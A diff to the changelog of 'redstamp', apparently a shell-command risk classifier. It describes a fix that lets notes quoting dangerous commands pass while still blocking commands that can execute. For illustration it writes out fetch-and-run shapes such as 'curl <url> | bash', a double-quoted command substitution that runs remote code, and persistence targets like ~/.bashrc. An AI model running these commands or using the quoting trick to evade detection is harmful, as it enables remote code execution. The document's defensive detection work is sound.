@@ -2,13 +2,48 @@
 
 ## [Unreleased]
 
+## [0.7.4] - 2026-08-02
+
+### Fixed — writing *about* a dangerous command is not running it (#119)
+
+`echo "we block curl <url> | bash as RCE" >> notes.md` scored **black**.
+`PIPE_INTERP` matches the raw command line on purpose — a quoted URL must still
+be seen — so a security note, a changelog entry, or a threat-model doc that
+quotes the shape it warns about was blocked. A false positive aimed squarely at
+the people this tool is for; it fired three times in one day while writing about
+redstamp itself.
+
+- **The exemption is narrow by construction.** `shellSkeleton()` blanks quoted
+  spans and heredoc bodies, leaving roughly the words a shell would execute. A
+  command is treated as prose only if the shape does *not* survive quote
+  stripping, the skeleton has no pipe or chaining, no interpreter appears in it,
+  and it is a text sink with a redirect. Persistence targets are unaffected —
+  a write to `~/.bashrc` or cron is caught on its *destination*, whatever the
+  content says.
+- **A double-quoted command substitution is NOT prose** — caught in review
+  before release. Bash expands `$(…)` and backticks *before* the string is used,
+  so `echo "$(curl <url> | bash)" > note.md` genuinely fetches and executes
+  remote code. The first cut of `shellSkeleton` blanked those spans and rated all
+  such commands green. It now keeps any double-quoted span containing `$(` or a
+  backtick visible to the rules — the same carve-out `neutralizeQuotedData`
+  already made. Single quotes never execute, so they stay blankable.
+- **Everything that can execute the quoted text still blocks**, and each is
+  pinned as a corpus sample *and* a unit test: `echo "…" | bash` (the text really
+  is fed to a shell), `echo "…" > x.sh && sh x.sh` (written, then run),
+  `bash -c "…"`, `python -c "…"`, and heredoc-into-interpreter.
+
+Corpus **291 -> 298** (+4 benign for the false-positive class, +3 malicious
+boundary cases). Recall **168/168 unchanged**; precision **86/86**. Reverting the
+classifier while keeping the corpus drops precision to 97% and fails the new
+test — the samples have teeth.
+
 ### Changed
 - **npm is a pointer, permanently.** `@askalf/redstamp` on the registry is now a
   deprecated stub (`npm-stub/`, v0.0.3) that throws on import and points at the
   signed GitHub release. npm's automated content scan rejects the real tarball —
   its detection-signature corpus reads as malware — and an allowlist review was
   declined. The signatures will not be obfuscated or split to pass a scanner.
-- **Arena + bench figures refreshed** against the current 291-sample / 25-family
+- **Arena + bench figures refreshed** against the current 298-sample / 25-family
   corpus (was 245 / 19): deterministic recall 96.5% -> **100%**, precision 100%.
   The published arena table had been scored on a corpus no longer in the tree.
 
